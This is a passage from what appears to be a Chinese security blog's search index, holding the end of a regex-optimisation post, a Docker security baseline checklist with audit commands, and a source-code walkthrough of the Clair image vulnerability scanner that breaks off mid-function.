谨慎用点号元字符，尽可能不用星号和加号这样的任意量词\n\n例子： 要匹配 <12345>，其中<>中间是1-5位的数字\n\n**正常写法：** <\\d*>\n\n**优化写法：** <\\d{1,5}>\n\n### e）提取多选结构开头的相同字符\n\n例如 the|this 改成th(?:e|is)\n\n### f）使用占有优先量词和固化分组\n\n**占有优先量词：**\n\n> ?+ *+ ++ {m,n}+\n\n占有优先量词与匹配优先量词很相似，只是它们从来不会交还已经匹配的字符。\n\n**固化分组：**\n\n> (?>...)   ...是指具体内容\n\n固化分组的内容与正常的匹配并无区别，只是当匹配完括号中的内容后，括号中的备用状态会全部舍去。\n\n### g）始、行描点优化\n\n能确定起止位置，使用^能提高匹配的速度。同理，使用$标记结尾，正则引擎则会从符合条件的长度处开始匹配，略过目标字符串中许多可能的字符。在写正则表达式时，应该将描点独立出来，例如“^(?:abc|123)”比“^123|^abc”效率高，而“^(abc)”比“(^abc)”效率更高。","tags":["正则","回溯","贪婪算法"],"categories":["waf"]},{"title":"Docker安全基线归纳","url":"/2020/01/16/Docker安全基线归纳/","content":"\n# 1 宿主机安全\n\n## 1.1 避免生产环境使用实验功能\n\ndocker自1.13.0版本引入`--experimental`参数用以启用实验功能。使用实验性功能应该非常谨慎，因为相关功能是未被充分测试，可能存在bug甚至安全问题 \n\n**测试步骤：**查看配置文件是否开启实验性功能\n\n```shell\n$ vi /etc/default/docker\nDOCKER_OPTS=\"--experimental=true\" # 追加此行代码\n$ sudo service docker restart # 重启 docker daemon\n```\n\n```shell\n$ vi /etc/docker/daemon.json\n{\n        \"experimental\": true\n}\n```\n\n## 1.2 确认Docker软件关键文件安全性\n\n- 1.2.1 确认docker.service文件所有权为root:root\n- 1.2.2 确认docker.service文件权限为644或更严格\n- 1.2.3 确认docker.socket文件所有权为root:root\n- 1.2.4 确认docker.socket文件权限为644或更严格\n- 1.2.5 确认/etc/docker目录所有权为root:root\n- 1.2.6 确认/etc/docker目录权限为755或更严格\n- 1.2.7 确认镜像仓库证书文件所有权为root:root\n- 1.2.8 确认镜像仓库证书文件权限为444或更严格\n- 1.2.9 确认TLS CA证书文件所有权为root:root\n- 1.2.10 确认TLS CA证书文件权限为444或更严格\n- 1.2.11 确认docker服务端证书文件所有权为root:root\n- 1.2.12 确认docker服务端证书文件权限为444或更严格\n- 1.2.13 确认docker服务端证书密钥文件所有权为root:root\n- 1.2.14 确认docker服务端证书密钥文件权限为400或更严格\n- 1.2.15 确认docker.sock文件所有权为root:docker\n- 1.2.16 确认docker.sock文件权限为660或更严格\n- 1.2.17 确认daemon.json文件所有权为root:root\n- 1.2.18 确认daemon.json文件权限为644或更严格\n- 1.2.19 确认/etc/default/docker文件所有权为root:root\n- 1.2.20 确认/etc/default/docker文件权限为644或更严格\n- 1.2.21 确认/etc/sysconfig/docker文件所有权为root:root\n\n**测试步骤**：使用linux命令查看这些文件对应的权限是否满足安全规范要求\n\n# 2 容器安全\n\n## 2.1 容器生命周期\n\n- 2.1.1 确保Docker软件更新到最新版本\n\n- 2.1.2 检查容器内软件生命周期\n- 2.1.3 避免镜像闲置冗余\n- 2.1.4 避免容器闲置冗余\n- 2.1.5 确保镜像仓库是最新版本\n- 2.1.6 确保镜像仓库是最新版本\n\n**测试步骤：**这几项基本就是判断软件是否是最新版的检测删除未使用或旧的镜像。\n\n```shell\n# 查看所有实例化image\nsudo docker images --quiet | xargs docker inspect --format '{{ .Id }}: Image={{ .Config.Image }}'\n# 查看系统中存在的所有image\ndocker images\n# 删除none镜像\nsudo docker rmi $(docker images -f dangling=true -q)\n```\n\n## 2.2 容器启动安全\n\n- 2.2.1 不要以读写形式挂载相同目录到多个容器\n\n  ```bash\n  docker ps -a --quiet | xargs docker inspect -f \"{{ .Name }} {{ .Mounts }}\"\n  ```\n\n- 2.2.2 不要使用特权/用户选项的docker exec命令\n\n  ```bash\n  # 查看是否使用特权 docker exec\n  ausearch -k docker | grep exec | grep privileged\n  \n  # 查看是否使用用户选项 docker exec\n  ausearch -k docker | grep exec | grep user\n  ```\n\n- 2.2.3 使用PIDS cgroup限制\n\n  ```bash\n  docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: PidsLimit={{ .HostConfig.PidsLimit }}'\n  ```\n\n  确保PidLimit不为0或-1\n\n- 2.2.4 不要在容器上挂载敏感的主机系统目录\n\n  ```bash\n  docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: Volumes={{ .Mounts }}'\n  ```\n\n- 2.2.5 限定容器重启次数上限(推荐5次)\n\n  ```bash\n  docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: RestartPolicyName={{ .HostConfig.RestartPolicy.Name }} MaximumRetryCount={{ .HostConfig.RestartPolicy.MaximumRetryCount }}'\n  ```\n\n- 2.2.6 不要直接将主机设备暴露给容器\n\n  ```bash\n  docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: Devices={{ .HostConfig.Devices }}'\n  \n  ```\n\n- 2.2.7 禁止以共享模式挂载卷\n\n  ```bash\n  docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: Propagation={{range $mnt := .Mounts}} {{json $mnt.Propagation}} {{end}}'\n  \n  ```\n\n- 2.2.8 不要将Docker socket挂载到任何容器内\n\n  ```bash\n  docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: Volumes={{ .Mounts }}' | grep docker.sock\n  \n  ```\n\n- 2.2.9 不要使用特权容器\n\n  ```bash\n  docker ps --quiet -a | xargs docker inspect --format='{{.Id}} {{.Name}} {{.HostConfig.Privileged}}'\n  \n  ```\n\n- 2.2.10 创建容器的用户\n\n  ```\n  # 为空则使用root\n  docker ps --quiet | xargs docker inspect --format '{{ .Id }}: User={{.Config.User}}\n  \n  ```\n\n- 2.2.11 容器使用可信的基础镜像\n\n  ```bash\n  docker history <imageName>\n  \n  ```\n\n- 2.2.12 容器内不安装非必要软件包\n\n  ```bash\n  docker exec $INSTANCE_ID rpm –qa\n  # 或者 \n  docker exec $ INSTANCE_ID dpkg –l\n  \n  ```\n\n- 2.2.13 启用docker内容信任\n\n  ```bash\n  echo $DOCKER_CONTENT_TRUST\n  \n  ```\n\n- 2.2.14 不在dockerfile中单独使用更新命令\n\n- 2.2.15 镜像中删除setuid和setgid权限\n\n  ```bash\n  docker run <Image_ID> find / -perm +6000-type f -exec ls -ld {} \\; 2> /dev/null\n  \n  ```\n\n- 2.2.16 在dockerfile中使用copy而不是add\n\n  ```bash\n  # add指令可能从远程URL下载文件并执行解包等操作\n  \n  docker history <Image_ID> \n  # 或者访问dockerfile\n  \n  ```\n\n- 2.2.17 涉密信息不存储在dockerfile上\n\n  ```bash\n  docker history <Image_ID> \n  # 或者访问dockerfile\n  \n  ```\n\n- 2.2.18 仅安装已经验证的软件包\n\n  ```bash\n  docker history <Image_ID> \n  # 或者访问dockerfile\n  \n  ```\n\n## 2.3 容器编排安全\n\n### 2.3.1 docker swarm安全\n\n- 2.3.1.1 确认swarm模式下overlay驱动开启加密功能\n\n  ```bash\n  # 确认是否有使用overlay类型的网络驱动。如果没有返回结果，说明没有使用overlay驱动，无问题。\n  docker network ls|grep overlay\n  \n  # 确认返回结果中是否每一个overlay驱动都使用了encrypted选项\n  docker network ls --quiet |xargs docker network inspect --format '{{.Name}} {{.Driver}} {{.Options}}' |grep overlay\n  \n  ```\n\n- 2.3.1.2 非必要不要启用Swarm集群模式\n\n  ```bash\n  # 如果输出包括Swarm:active，则表明集群模式在Docker引擎上激活\n  docker info | grep Swarm\n  \n  ```\n\n- 2.3.1.3 控制群中的管理器节点数\n\n  ```bash\n  docker node ls | grep 'Leader'\n  # 或者\n  docker info --format'{{.Swarm.Manager}}'\n  \n  ```\n\n- 2.3.1.4 将集群服务绑定到特定网卡\n\n  ```bash\n  netstat -lt | grep -i 2377\n  \n  ```\n\n- 2.3.1.5 使用Docker的secret管理命令来管理集群中的secret\n\n  ```bash\n  docker secret ls\n  \n  ```\n\n- 2.3.1.6 在自动锁定模式下运行集群管理器\n\n  ```bash\n  # 若返回 no unlock key is set，说明没有开启 autolock\n  docker swarm unlock-key\n  \n  ```\n\n- 2.3.1.7 定期修改集群管理器自动锁定密钥\n\n  ```bash\n  # 可运行以下命令更换\n  Docker swarm unlock-key --rotate\n  \n  ```\n\n### 2.3.2 docker compose安全\n\n### 2.3.3 kubernetes安全\n\n## 2.4 容器存储安全\n\n- 2.4.1 为容器创建一个独立分区\n\n  docker根目是/var/lib/docker的情况: \n\n  ```bash\n  # 存储驱动非devicemapper\n  docker info |grep \"Storage Driver\"\n  \n  # 查看docker根目录是否挂载在独立分区\n  mountpoint -- $(docker info | grep \"Docker Root Dir\" | awk '{print $4}') \n  \n  ```\n\n  devicemapper的情况： devicemapper不需要单独配置挂载\n\n  ```bash\n  # 查看是否是否devicemapper\n  docker info |grep \"Storage Driver\"\n  \n  ```\n\n- 2.4.2 禁止使用aufs存储驱动\n\n  ```bash\n  # 查看是否使用aufs驱动\n  docker info | grep -e \"^Storage Driver:\\s*aufs\\s*$\"\n  \n  ```\n\n- 2.4.3 备份容器数据\n\n- 2.4.4 避免容器闲置冗余\n\n  ```bash\n  # 步骤 1 通过执行以下命令列出当前实例化的所有镜像 ID：\n  docker images --quiet | xargs docker inspect --format '{{.Id}}： Image = {{.Config.Image}}'\n  \n  # 步骤 2：通过执行以下命令列出系统中存在的所有镜像： \n  docker images\n  \n  # 步骤 3：比较步骤 1 和步骤 2 中的镜像 ID 列表， 找出当前未实例化的镜像。 如果发现未使用或旧镜像，请与系统管理员讨论是否需要在系统上保留这些镜像。\n  \n  ```\n\n## 2.5 容器网络安全\n\n- 2.5.1 限制容器间的网络通信\n\n  ```bash\n  # 确认返回结果com.docker.network.bridge.enable_icc对应值是否为false\n  docker network ls --quiet | xargs docker network inspect --format '{{ .Name }}: {{ .Options }}' | grep \"default_bridge\" \n  \n  ```\n\n- 2.5.2 避免docker daemon暴露于外网网络\n\n  ```bash\n  # 确认是否以端口形式对外开放docker api\n  ps -o user,args -e | grep docker | grep \"tcp:\" 2>/dev/null | sort\n  \n  ```\n\n- 2.5.3 禁止userland端口转发\n\n  ```bash\n  # 启动参数中是否配置\n  ps -o user,args -e | grep dockerd | grep '\\-\\-userland-proxy'\n  # 配置文件中是否配置\n  ps -ef | grep docker |grep \"\\-\\-config-file\"\n  \"userland-proxy\":false\n  \n  ```\n\n- 2.5.4 开启iptables选项\n\n  ```bash\n  # 启动参数中是否配置\n  ps -ef |grep docker |grep iptables\n  # 配置文件中是否配置\n  ps -ef | grep docker |grep \"\\-\\-config-file\"\n  \"iptables\": true\n  \n  ```\n\n- 2.5.5 不要使用Docker的默认网桥docker0\n\n  ```bash\n  # 易受到 ARP 欺骗以及 MAC 洪泛攻击\n  # 运行以下命令，确保没有使用 docker0 bridge\n  docker network ls --quiet | xargs docker network inspect --format '{{ .Name }}: {{ .Options }}'\n  \n  ```\n\n- 2.5.6 不要在容器中映射特权端口\n\n  ```bash\n  docker ps --quiet | xargs docker inspect --format '{{ .Id }}: Ports={{ .NetworkSettings.Ports }}'\n  \n  ```\n\n- 2.5.7 不用共享host's network命令空间\n\n  ```bash\n  # 若返回 'NetworkMode=host'，就说明启动时加入了 '--net=host' 参数，命名空间被共享\n  # 应放返回 bridge 或 none 或 container:$Container_Instance\n  docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: NetworkMode={{ .HostConfig.NetworkMode }}'\n  \n  ```\n\n- 2.5.8 在容器中开放需要的端口\n\n  ```bash\n  docker ps --quiet | xargs docker inspect --format '{{ .Id }}: Ports={{ .NetworkSettings.Ports }}'\n  \n  ```\n\n- 2.5.9 禁止将容器端口绑定到宿主机所有网卡\n\n  ```bash\n  docker ps --quiet | xargs docker inspect --format '{{ .Id }}: Ports={{ .NetworkSettings.Ports }}'\n  \n  ```\n\n# 3 运行安全\n\n## 3.1 安全机制配置\n\n- 3.1.1 启用live restore\n\n  ```\n  默认情况下，当daemon进程结束时，所有容器会被停止。自docker engine 1.12起，可以配置live-restore， 以支持当daemon不可用时，容器仍然正常运行。该功能在daemon崩溃、断电、升级时，能有效保证容器正常运行。该功能默认不会开启，需要手动配置。 \n  \n  ```\n\n- 3.1.2 确保cgroup参数正确配置\n\n  ```bash\n  # 如果为空，则表示容器在默认的docker cgroup 下运行,可以认为是安全的\n  docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}:CgroupParent={{ .HostConfig.CgroupParent }}'\n  \n  ```\n\n- 3.1.3 确认默认seccomp规则正确配置\n\n  ```bash\n  # 返回default使用默认配置，无问题\n  docker info --format='{{.SecurityOptions}}'\n  \n  ```\n\n- 3.1.4 不要禁用AppArmor文件\n\n  ```bash\n  docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: AppArmorProfile={{ .AppArmorProfile }}'\n  \n  ```\n\n- 3.1.5 限制容器内的Linux Capabilities\n\n  ```bash\n  docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: CapAdd={{ .HostConfig.CapAdd }} CapDrop={{ .HostConfig.CapDrop }}'\n  \n  ```\n\n- 3.1.6 设置SELinux选项(可选)\n\n  ```bash\n  docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: SecurityOpt={{ .HostConfig.SecurityOpt }}'\n  \n  ```\n\n- 3.1.7不要共享宿主机process namespace\n\n  ```bash\n  #PID\n  docker ps --quiet | xargs docker inspect --format '{{ .Id }}: PidMode={{ .HostConfig.PidMode }}'\n  \n  ```\n\n- 3.1.8 不要共享宿主机 IPC namespace\n\n  ```bash\n  #IPC\n  docker ps --quiet | xargs docker inspect --format '{{ .Id }}: IpcMode={{ .HostConfig.IpcMode }}'\n  \n  ```\n\n- 3.1.9 不要共享宿主机 UTS namespace\n\n  ```bash\n  #UTS\n  docker ps --quiet | xargs docker inspect --format '{{ .Id }}: UTSMode={{ .HostConfig.UTSMode }}'\n  \n  ```\n\n## 3.2 资源消耗\n\n- 3.2.1 设置默认的ulimit配置（可选）\n\n  ```bash\n  # 返回 <no value> 表示使用默认配置，没问题\n  docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: Ulimits={{ .HostConfig.Ulimits }}'\n  \n  ```\n\n- 3.2.2 检测是否限制容器CPU使用\n\n  ```bash\n  # 如果命令返回0或1024，说明未限制CPU共享；如果返回一个非零值（非1024）表示已限制CPU共享。\n  docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: CpuShares={{ .HostConfig.CpuShares }}'\n  \n  ```\n\n- 3.2.3 检测是否限制容器内存使用\n\n  ```bash\n  # 如果命令返回0，说明未限制容器内存使用；如果返回一个非零值，表示已限制容内存使用\n  docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: Memory={{ .HostConfig.Memory }}'\n  \n  ```\n\n- 3.2.4  检测是否已限制容器存储使用 \n\n- 3.2.5  使用PIDs_cgroup_limit防止fork炸弹\n\n  ```bash\n  # 执行如下命令，确保PidsLimit的值不为0或-1。PidsLimit为0或-1意味着可以在容器内并发地创建任意数量的进程。\n  docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: PidsLimit={{ .HostConfig.PidsLimit }}'\n  ```\n\n","tags":["docker","基线"],"categories":["docker安全"]},{"title":"Docker镜像扫描原理","url":"/2019/12/19/Docker镜像扫描原理/","content":"\n# Docker镜像简介\n\nDocker镜像是由文件系统叠加而成。最底层是bootfs，之上的部分为rootfs。\n\n**bootfs**是docker镜像最底层的引导文件系统，包含bootloader和操作系统内核。\n\n**rootfs**通常包含一个操作系统运行所需的文件系统。这一层作为基础镜像。\n\n在基础镜像之上，会加入各种镜像，如emacs、apache等。\n\n![img](/images/b5/1.png)\n\n Linux中的文件系统有些功能设计的很巧妙，比如挂载(mount)，允许把一个外部的文件系统（如CD，USB）以本地路径的形式去访问。例如放置一张CD后，我们可以通过访问`/mnt/cdrom`来查看CD中的内容。 \n\n Union File System（UnionFS）则设计的更加巧妙。在「挂载」功能的基础上，UnionFS允许在本地路径挂载多个目标目录。 \n\nUnionFS技术在Docker容器技术中的运用，首先体现在「镜像（image）」和「容器（container）」上。每一个Docker镜像都是一个只读的文件夹，当在容器中运行镜像时，Docker会自动挂载镜像中的、只读的文件目录，以及宿主机上一个临时的、可写的文件目录。容器中所有文件修改，都会写入这个临时目录里去。容器终结后，这个临时目录也会被相应删除。 \n\nUnionFS在Docker中的另一个应用，还体现在镜像本身上。容器运行时，在挂载的临时目录中如果写入数据，还可以选择把这部分数据从临时目录中保存下来，这样就生成了一个新的镜像。Docker在保存新镜像时，会把它们两部分——原镜像和增量——都保存在新镜像中。其中新的增量部分，就被称为「层（layer）」。\n\n## docker镜像保存\n\ndocker镜像是是分层存储的， 存储器包括aufs和overlay，overlay2等，默认存储在根路径`/var/lib/docker`下。\n\n使用`docker image insepect ubuntu`，查看ubuntu镜像的layer地址\n\n```json\n        \"GraphDriver\": {\n            \"Name\": \"overlay2\",\n            \"Data\": {\n                \"LowerDir\": \"/var/lib/docker/overlay2/dae8b41387884954d897fdab0aace674b1ccf29d7122d2b4aaa72f1874ac4b8b/diff:/var/lib/docker/overlay2/f5ae89ddaae69a185e5b352dbf5a18390f3f2024492db3d0e981892c767b919f/diff:/var/lib/docker/overlay2/c59b417d51fc4a6e590391d59a5a273b44d1c9c1a45d02806591dc735ee785e5/diff\",\n                \"MergedDir\": \"/var/lib/docker/overlay2/8a801c1be8981cb28da1083b255216027fc68449efe36cc39f7d7ea8cbb96e98/merged\",\n                \"UpperDir\": \"/var/lib/docker/overlay2/8a801c1be8981cb28da1083b255216027fc68449efe36cc39f7d7ea8cbb96e98/diff\",\n                \"WorkDir\": \"/var/lib/docker/overlay2/8a801c1be8981cb28da1083b255216027fc68449efe36cc39f7d7ea8cbb96e98/work\"\n            }\n        },\n```\n\n**LowerDir** 是包含image的只读层，表示更改的读写层是 **UpperDir**的一部分。**MergedDir**表示Docker用于运行容器的`UpperDir`和`LowerDi`r的结果。**WorkDir**是`overlay2`的内部目录，应该为空。\n\n# clair扫描原理\n\nClair首先对镜像进行特征的提取，然后再将这些特征匹配CVE漏洞库，若发现漏洞则进行提示，其功能侧重于扫描容器中的OS及APP的CVE漏洞。该工具可以交叉检查Docker镜像的操作系统以及上面安装的任何包是否与任何已知不安全的包版本相匹配，支持跟K8S、Registry结合在一起，在镜像构建过程进行漏洞扫描，支持OS广泛，提供API，能提供构建阻断和报警。\n\n在开始分析Clair之前，我们需要明白几点：\n\n- Clair是以静态分析的方式对镜像进行分析的，有点类似于杀毒软件用特征码来扫描病毒。\n- Clair镜像分析是按镜像Layer层级来进行的，如果某一层的软件有漏洞，在上层被删除了，该漏洞还是存在的。\n- Clair的漏洞扫描是通过软件版本比对来完成的，如果某个应用，比如Nginx ，它在镜像中的版本为1.0.0，而该版本在数据库中存在1.0.0对应的漏洞数据，则表示该镜像存在对应的漏洞。 \n\n**架构：**\n\n![img](/images/b5/2.png)\n\n整体处理流程如下：\n\n- Clair定期从配置的源获取漏洞元数据然后存进数据库。\n- 客户端使用Clair API处理镜像，获取镜像的特征并存进数据库。\n- 客户端使用Clair API从数据库查询特定镜像的漏洞情况，为每个请求关联漏洞和特征，避免需要重新扫描镜像。\n- 当更新漏洞元数据时，将会有系统通知产生。另外，还有WebHook用于配置将受影响的镜像记录起来或者拦截其部署。\n\n![img](/images/b5/3.png)\n\n## 客户端扫描\n\n客户端 [analyze-local-images](https://raw.githubusercontent.com/coreos/analyze-local-images/master/main.go) ，执行流程\n\n` main()->intMain()->AnalyzeLocalImage()—>analyzeLayer()->getLayer() `\n\n1） 在tmp文件夹新建临时文件夹\n\n```go\n\ttmpPath, err := ioutil.TempDir(\"\", \"analyze-local-image-\")\n\tif err != nil {\n\t\tlog.Fatalf(\"Could not create temporary folder: %s\", err)\n\t}\n\tdefer os.RemoveAll(tmpPath)\n\n\t// Intercept SIGINT / SIGKILl signals.\n\tinterrupt := make(chan os.Signal)\n\tsignal.Notify(interrupt, os.Interrupt, os.Kill)\n\n\t// Analyze the image.\n\tanalyzeCh := make(chan error, 1)\n\tgo func() {\n\t\tanalyzeCh <- AnalyzeLocalImage(imageName, minSeverity, *flagEndpoint, *flagMyAddress, tmpPath)\n\t}()\n```\n\n2） 跟进AnalyzeLocalImage函数\n\n```go\nfunc AnalyzeLocalImage(imageName string, minSeverity database.Severity, endpoint, myAddress, tmpPath string) error {\n\t// Save image.\n\tlog.Printf(\"Saving %s to local disk (this may take some time)\", imageName)\n\terr := save(imageName, tmpPath)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"Could not save image: %s\", err)\n\t}\n\n\t// Retrieve history.\n\tlog.Println(\"Retrieving image history\")\n\tlayerIDs, err := historyFromManifest(tmpPath)\n\tif err != nil {\n\t\tlayerIDs, err = historyFromCommand(imageName)\n\t}\n\tif err != nil || len(layerIDs) == 0 {\n\t\treturn fmt.Errorf(\"Could not get image's history: %s\", err)\n\t}\n```\n\n跟进save函数，使用`docker save`保存镜像，并解压到上面建的tmp文件夹下\n\n```go\nfunc save(imageName, path string) error {\n\tvar stderr bytes.Buffer\n\tsave := exec.Command(\"docker\", \"save\", imageName)\n\tsave.Stderr = &stderr\n\textract := exec.Command(\"tar\", \"xf\", \"-\", \"-C\"+path)\n\textract.Stderr = &stderr\n\tpipe, err := extract.StdinPipe()\n\tif err != nil {\n\t\treturn err\n\t}\n```\n\n跟进historyFromMainfest函数，分析manifest.json，获取镜像的layer信息\n\n```go\nfunc historyFromManifest(path string) ([]string, error) {\n\tmf, err := os.Open(path + \"/manifest.json\")\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tdefer mf.Close()\n\n\t// https://github.com/docker/docker/blob/master/image/tarexport/tarexport.go#L17\n\ttype manifestItem struct {\n\t\tConfig   string\n\t\tRepoTags []string\n\t\tLayers   []string\n\t}\n\n\tvar manifest []manifestItem\n\tif err = json.NewDecoder(mf).Decode(&manifest); err != nil {\n\t\treturn nil, err\n\t} else if len(manifest) != 1 {\n\t\treturn nil, err\n\t}\n\tvar layers []string\n\tfor _, layer := range manifest[0].Layers {\n\t\tlayers = append(layers, strings.TrimSuffix(layer, \"/layer.tar\"))\n\t}\n\treturn layers, nil\n}\n```\n\n3）跟进分析analyzeLayer和getLayer函数，分别是发送请求到服务端和从服务端获取漏洞信息结果\n\n```go\nfunc analyzeLayer(endpoint, path, layerName, parentLayerName string) error {\n\tpayload := v1.LayerEnvelope{\n\t\tLayer: &v1.Layer{\n\t\t\tName:       layerName,\n\t\t\tPath:       path,\n\t\t\tParentName: parentLayerName,\n\t\t\tFormat:     \"Docker\",\n\t\t},\n\t}\n\n\tjsonPayload, err := json.Marshal(payload)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\trequest, err := http.NewRequest(\"POST\", endpoint+postLayerURI, bytes.NewBuffer(jsonPayload))\n\tif err != nil {\n\t\treturn err\n\t}\n\trequest.Header.Set(\"Content-Type\", \"application/json\")\n\n\tclient := &http.Client{}\n\tresponse, err := client.Do(request)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer response.Body.Close()\n\n\tif response.StatusCode != 201 {\n\t\tbody, _ := ioutil.ReadAll(response.Body)\n\t\treturn fmt.Errorf(\"Got response %d with message %s\", response.StatusCode, string(body))\n\t}\n\n\treturn nil\n}\n\nfunc getLayer(endpoint, layerID string) (v1.Layer, error) {\n\tresponse, err := http.Get(endpoint + fmt.Sprintf(getLayerFeaturesURI, layerID))\n\tif err != nil {\n\t\treturn v1.Layer{}, err\n\t}\n\tdefer response.Body.Close()\n\n\tif response.StatusCode != 200 {\n\t\tbody, _ := ioutil.ReadAll(response.Body)\n\t\terr := fmt.Errorf(\"Got response %d with message %s\", response.StatusCode, string(body))\n\t\treturn v1.Layer{}, err\n\t}\n\n\tvar apiResponse v1.LayerEnvelope\n\tif err = json.NewDecoder(response.Body).Decode(&apiResponse); err != nil {\n\t\treturn v1.Layer{}, err\n\t} else if apiResponse.Error != nil {\n\t\treturn v1.Layer{}, errors.New(apiResponse.Error.Message)\n\t}\n\n\treturn *apiResponse.Layer, nil\n}\n```\n\n客户端做的事情很简单， **就是将layer.tar发送给clair，并将clair分析后的结果通过API接口获取到并在本地打印。** \n\n## 服务端扫描 \n\nanalyze-local-images 发送layer.tar文件后主要是由/worker.go下的ProcessLayer方法进行处理的。\n\n这里先简单讲下clair的目录结构，我们仅需要重点关注有注释的文件夹。\n\n> |–api //api接口\n>\n> |– cmd//服务端主程序\n>\n> |–contrib\n>\n> |–database //数据库相关\n>\n> |–Documentation\n>\n> |–ext //拓展功能\n>\n> |– pkg//通用方法\n>\n> |– testdata\n>\n> `–vendor\n\n为了能够深入理解Clair，我们还是要从其main函数开始分析。\n\n/cmd/clair/main.go\n\n```go\nfuncmain() {\n   // 解析命令行参数，默认从/etc/clair/config.yaml读取数据库配置信息\n\n   ......\n   // 加载配置文件\n   config, err :=LoadConfig(*flagConfigPath)\n   if err != nil {\n      log.WithError(err).Fatal(\"failedto load configuration\")\n   }\n\n   // 初始化日志系统\n\n......\n\n//启动clair\n   Boot(config)\n}\n\n \n\n# /cmd/clair/main.go\n\nfuncBoot(config *Config) {\n   ......\n   // 打开数据库\n   db, err :=database.Open(config.Database)\n   if err != nil {\n      log.Fatal(err)\n   }\n   defer db.Close()\n\n   // 启动notifier服务\n   st.Begin()\n   go clair.RunNotifier(config.Notifier,db, st)\n\n   // 启动clair的Rest API 服务\n   st.Begin()\n   go api.Run(config.API, db, st)\n   st.Begin()\n\n//启动clair的健康检测服务\n   go api.RunHealth(config.API, db, st)\n\n   // 启动updater服务\n   st.Begin()\n   go clair.RunUpdater(config.Updater,db, st)\n\n   // Wait for interruption and shutdowngracefully.\n   waitForSignals(syscall.SIGINT,syscall.SIGTERM)\n   log.Info(\"Received interruption,gracefully stopping ...\")\n   st.Stop()\n}\n```\n\nGo api.Run执行后，clair会开启Rest服务。\n\n/api/api.go\n\n```go\nfunc Run(cfg *Config, store database.Datastore, st *stopper.Stopper) {\n   defer st.End()\n\n   // 如果配置为空就不启动服务\n   ......\n   srv := &graceful.Server{\n      Timeout:          0,    // Already handled by our TimeOut middleware\n      NoSignalHandling: true, // We want to use our own Stopper\n      Server: &http.Server{\n         Addr:      \":\" + strconv.Itoa(cfg.Port),\n         TLSConfig: tlsConfig,\n         Handler:   http.TimeoutHandler(newAPIHandler(cfg, store), cfg.Timeout, timeoutResponse),\n      },\n   }\n\n//启动HTTP服务   \nlistenAndServeWithStopper(srv, st, cfg.CertFile, cfg.KeyFile)\n\n   log.Info(\"main API stopped\")\n}\n```\n\nApi.Run中调用api.newAPIHandler生成一个API Handler来处理所有的API请求。\n\n/api/router.go\n\n```go\nfuncnewAPIHandler(cfg *Config, store database.Datastore) http.Handler {\n   router := make(router)\n   router[\"/v1\"] =v1.NewRouter(store, cfg.PaginationKey)\n   return router\n}\n```\n\n所有的router对应的Handler都在\n\n/api/v1/router.go中：\n\n```go\n funcNewRouter(store database.Datastore, paginationKey string) *httprouter.Router {\n   router := httprouter.New()\n   ctx := &context{store,paginationKey}\n\n   // Layers\n   router.POST(\"/layers\",httpHandler(postLayer, ctx))\n  router.GET(\"/layers/:layerName\", httpHandler(getLayer, ctx))\n  router.DELETE(\"/layers/:layerName\", httpHandler(deleteLayer,ctx))\n\n   // Namespaces\n   router.GET(\"/namespaces\",httpHandler(getNamespaces, ctx))\n\n   // Vulnerabilities\n  router.GET(\"/namespaces/:namespaceName/vulnerabilities\",httpHandler(getVulnerabilities, ctx))\n   router.POST(\"/namespaces/:namespaceName/vulnerabilities\",httpHandler(postVulnerability, ctx))\n  router.GET(\"/namespaces/:namespaceName/vulnerabilities/:vulnerabilityName\",httpHandler(getVulnerability, ctx))\n  router.PUT(\"/namespaces/:namespaceName/vulnerabilities/:vulnerabilityName\",httpHandler(putVulnerability, ctx))\n  router.DELETE(\"/namespaces/:namespaceName/vulnerabilities/:vulnerabilityName\",httpHandler(deleteVulnerability, ctx))\n\n   // Fixes\n  router.GET(\"/namespaces/:namespaceName/vulnerabilities/:vulnerabilityName/fixes\",httpHandler(getFixes, ctx))\n  router.PUT(\"/namespaces/:namespaceName/vulnerabilities/:vulnerabilityName/fixes/:fixName\",httpHandler(putFix, ctx))\n  router.DELETE(\"/namespaces/:namespaceName/vulnerabilities/:vulnerabilityName/fixes/:fixName\",httpHandler(deleteFix, ctx))\n\n   // Notifications\n  router.GET(\"/notifications/:notificationName\",httpHandler(getNotification, ctx))\n  router.DELETE(\"/notifications/:notificationName\",httpHandler(deleteNotification, ctx))\n\n   // Metrics\n   router.GET(\"/metrics\",httpHandler(getMetrics, ctx))\n\n   return router\n}\n```\n\n而具体的Handler是在/api/v1/routers.go中\n\n例如analyze-local-images 发送的layer.tar文件，最终会交给postLayer方法处理。\n\n```go\nfuncpostLayer(w http.ResponseWriter, r *http.Request, p httprouter.Params, ctx*context) (string, int) {\n  ......\n   err = clair.ProcessLayer(ctx.Store,request.Layer.Format, request.Layer.Name, request.Layer.ParentName,request.Layer.Path, request.Layer.Headers)\n   ......\n}\n```\n\n而ProcessLayer 方法就是在/worker.go中定义的。\n\n```go\nfuncProcessLayer(datastore database.Datastore, imageFormat, name, parentName, pathstring, headers map[string]string) error {\n  //参数验证\n\n......\n   // 检测层是否已经入库\n\n  layer, err := datastore.FindLayer(name, false, false)\n   if err != nil && err !=commonerr.ErrNotFound {\n      return err\n   }\n\n\n//如果存在并且该layer的Engine Version比DB中记录的大于等于3（目前最大的worker version）,则表明已经detect过这个layer，则结束返回。否则detectContent对数据进行解析。\n  \n   // Analyze the content.\n   layer.Namespace, layer.Features, err =detectContent(imageFormat, name, path, headers, layer.Parent)\n   if err != nil {\n      return err\n   }\n\n   return datastore.InsertLayer(layer)\n}\n```\n\n在detectContent方法如下：\n\n```go\nfunc detectContent(imageFormat,name, 